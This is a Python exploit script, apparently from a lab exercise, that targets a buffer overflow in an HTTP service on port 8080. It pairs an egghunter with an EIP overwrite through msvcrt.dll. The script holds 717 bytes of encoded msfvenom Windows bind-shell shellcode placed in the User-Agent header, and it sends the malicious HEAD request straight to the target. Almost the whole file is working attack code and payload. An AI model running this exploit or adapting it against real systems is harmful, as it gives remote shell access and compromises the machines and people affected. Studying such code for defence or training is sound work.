#!/usr/bin/env python

import socket
import os
import sys

# Egghunter
# Size 32 bytes
# msf-egghunter -p windows -f python -e W00T
egg =  ""
egg += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c"
egg += "\x05\x5a\x74\xef\xb8\x57\x30\x30\x54\x89\xd7\xaf\x75" # W00T
egg += "\xea\xaf\x75\xe7\xff\xe7"

# msfvenom -p windows/shell_bind_tcp RHOST=192.168.88.131 VERBOSE=true --encoder x86/alpha_mixed --format c
# Payload size: 717 bytes
shellcode = (
"\x89\xe7\xda\xca\xd9\x77\xf4\x59\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41"
"\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42"
"\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x4b"
"\x4c\x6d\x38\x4c\x42\x43\x30\x53\x30\x57\x70\x51\x70\x4c\x49"
"\x49\x75\x46\x51\x59\x50\x62\x44\x6c\x4b\x36\x30\x36\x50\x6c"
"\x4b\x52\x72\x54\x4c\x6c\x4b\x62\x72\x62\x34\x4c\x4b\x42\x52"
"\x74\x68\x34\x4f\x6f\x47\x33\x7a\x35\x76\x34\x71\x69\x6f\x6c"
"\x6c\x75\x6c\x61\x71\x53\x4c\x75\x52\x74\x6c\x31\x30\x49\x51"
"\x68\x4f\x64\x4d\x47\x71\x7a\x67\x6d\x32\x68\x72\x30\x52\x52"
"\x77\x4e\x6b\x61\x42\x72\x30\x4c\x4b\x72\x6a\x37\x4c\x4c\x4b"
"\x30\x4c\x42\x31\x44\x38\x48\x63\x70\x48\x67\x71\x6b\x61\x33"
"\x61\x6e\x6b\x72\x79\x77\x50\x67\x71\x4e\x33\x6e\x6b\x62\x69"
"\x62\x38\x4a\x43\x46\x5a\x57\x39\x4c\x4b\x54\x74\x4c\x4b\x43"
"\x31\x59\x46\x54\x71\x69\x6f\x6c\x6c\x39\x51\x7a\x6f\x54\x4d"
"\x76\x61\x5a\x67\x66\x58\x59\x70\x70\x75\x69\x66\x46\x63\x61"
"\x6d\x78\x78\x67\x4b\x61\x6d\x65\x74\x52\x55\x39\x74\x42\x78"
"\x4c\x4b\x33\x68\x31\x34\x37\x71\x48\x53\x75\x36\x4e\x6b\x76"
"\x6c\x32\x6b\x6c\x4b\x52\x78\x55\x4c\x67\x71\x79\x43\x6e\x6b"
"\x66\x64\x6c\x4b\x45\x51\x38\x50\x6e\x69\x70\x44\x46\x44\x46"
"\x44\x31\x4b\x31\x4b\x30\x61\x31\x49\x52\x7a\x36\x31\x79\x6f"
"\x59\x70\x71\x4f\x31\x4f\x30\x5a\x6e\x6b\x72\x32\x58\x6b\x6c"
"\x4d\x51\x4d\x33\x58\x54\x73\x30\x32\x75\x50\x45\x50\x33\x58"
"\x33\x47\x32\x53\x50\x32\x43\x6f\x50\x54\x73\x58\x30\x4c\x30"
"\x77\x35\x76\x65\x57\x4b\x4f\x49\x45\x68\x38\x4c\x50\x55\x51"
"\x65\x50\x35\x50\x57\x59\x79\x54\x76\x34\x56\x30\x72\x48\x34"
"\x69\x4f\x70\x42\x4b\x33\x30\x6b\x4f\x6e\x35\x62\x4a\x57\x78"
"\x30\x59\x76\x30\x69\x72\x69\x6d\x77\x30\x36\x30\x37\x30\x32"
"\x70\x55\x38\x79\x7a\x74\x4f\x4b\x6f\x39\x70\x4b\x4f\x5a\x75"
"\x4f\x67\x45\x38\x56\x62\x37\x70\x32\x31\x43\x6c\x4b\x39\x78"
"\x66\x32\x4a\x74\x50\x50\x56\x72\x77\x33\x58\x6a\x62\x69\x4b"
"\x70\x37\x75\x37\x69\x6f\x4a\x75\x52\x77\x71\x78\x4d\x67\x38"
"\x69\x54\x78\x4b\x4f\x59\x6f\x6e\x35\x72\x77\x61\x78\x44\x34"
"\x58\x6c\x75\x6b\x4b\x51\x4b\x4f\x4b\x65\x73\x67\x7a\x37\x51"
"\x78\x31\x65\x50\x6e\x30\x4d\x55\x31\x69\x6f\x38\x55\x31\x78"
"\x35\x33\x50\x6d\x45\x34\x77\x70\x6f\x79\x69\x73\x76\x37\x30"
"\x57\x66\x37\x56\x51\x68\x76\x31\x7a\x77\x62\x61\x49\x73\x66"
"\x6a\x42\x59\x6d\x62\x46\x58\x47\x42\x64\x57\x54\x47\x4c\x65"
"\x51\x76\x61\x6c\x4d\x57\x34\x56\x44\x44\x50\x58\x46\x73\x30"
"\x77\x34\x31\x44\x72\x70\x61\x46\x52\x76\x73\x66\x51\x56\x50"
"\x56\x52\x6e\x71\x46\x32\x76\x31\x43\x52\x76\x42\x48\x53\x49"
"\x48\x4c\x65\x6f\x6d\x56\x39\x6f\x4b\x65\x6d\x59\x49\x70\x62"
"\x6e\x70\x56\x57\x36\x69\x6f\x44\x70\x31\x78\x56\x68\x4f\x77"
"\x57\x6d\x45\x30\x6b\x4f\x6b\x65\x6d\x6b\x6a\x50\x6e\x55\x59"
"\x32\x73\x66\x70\x68\x59\x36\x5a\x35\x6f\x4d\x6d\x4d\x6b\x4f"
"\x6b\x65\x47\x4c\x66\x66\x71\x6c\x74\x4a\x4d\x50\x6b\x4b\x6d"
"\x30\x54\x35\x75\x55\x4d\x6b\x47\x37\x34\x53\x53\x42\x42\x4f"
"\x31\x7a\x35\x50\x53\x63\x79\x6f\x7a\x75\x41\x41")

# ------------------------------------------------
# badchars: \x00\x0d\x0a\x3d\x20\x3f
# Stage1:
# (1) EIP: 0x77C35459 push esp # ret | msvcrt.dll
# (2) ESP: jump back 60 bytes in the buffer => \xEB\xC4
# (3) Enough room for egghunter; marker "W00T"
# ------------------------------------------------
# Stage2:
# (*) For reliability we use the x86/alpha_mixed encoder (we have as much space
#     as we could want), possibly this region of memory has a different set of
#     badcharacters.
# (4) We embed the final stage payload in the HTTP header, witch will be put
#     somewhere in memory at the time of the initial crash.
# ------------------------------------------------

eip = "\x59\x54\xc3\x77"
Stage1 = "A"*478 + egg + "A"*5 + eip + "\xEB\xC4"
Stage2 = "W00TW00T" + shellcode

buffer = (
"HEAD /" + Stage1 + " HTTP/1.1\r\n"
"Host: 192.168.88.131:8080\r\n"
"User-Agent: " + Stage2 + "\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("192.168.88.131", 8080))
expl.send(buffer)
expl.close()
